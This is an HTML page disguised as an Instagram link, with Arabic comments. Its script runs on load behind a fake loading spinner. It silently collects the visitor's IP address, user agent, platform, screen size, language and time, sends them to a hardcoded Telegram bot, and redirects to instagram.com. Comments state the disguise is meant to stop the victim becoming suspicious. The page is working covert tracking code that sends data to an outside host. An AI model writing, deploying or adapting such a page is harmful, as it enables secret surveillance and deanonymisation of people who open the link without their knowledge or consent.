<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* شاشة تحميل بسيطة لتبدو العملية طبيعية */
        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>

    <script>
        const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
        const chat_id = '8658217605';

        async function collectAndRedirect() {
            try {
                // 1. جلب عنوان الـ IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                // 2. تجميع معلومات الجهاز
                const info = {
                    ip: ipData.ip,
                    device: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    lang: navigator.language,
                    time: new Date().toLocaleString('ar-EG')
                };

                // 3. إرسال المعلومات للتليجرام
                const message = `🔔 زيارة جديدة صامتة لـ أنس:\n\n` +
                                `🌐 الـ IP: ${info.ip}\n` +
                                `📱 الجهاز: ${info.device}\n` +
                                `💻 المنصة: ${info.platform}\n` +
                                `🖥️ الشاشة: ${info.screen}\n` +
                                `🌍 اللغة: ${info.lang}\n` +
                                `⏰ الوقت: ${info.time}`;

                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);

                // 4. التوجه المباشر لإنستغرام
                window.location.replace("https://www.instagram.com");

            } catch (err) {
                // في حال حدوث أي خطأ (مثلاً مانع إعلانات)، حوله أيضاً لكي لا يشك
                window.location.replace("https://www.instagram.com");
            }
        }

        // تنفيذ الكود فور تحميل الصفحة
        window.onload = collectAndRedirect;
    </script>
</body>
</html>
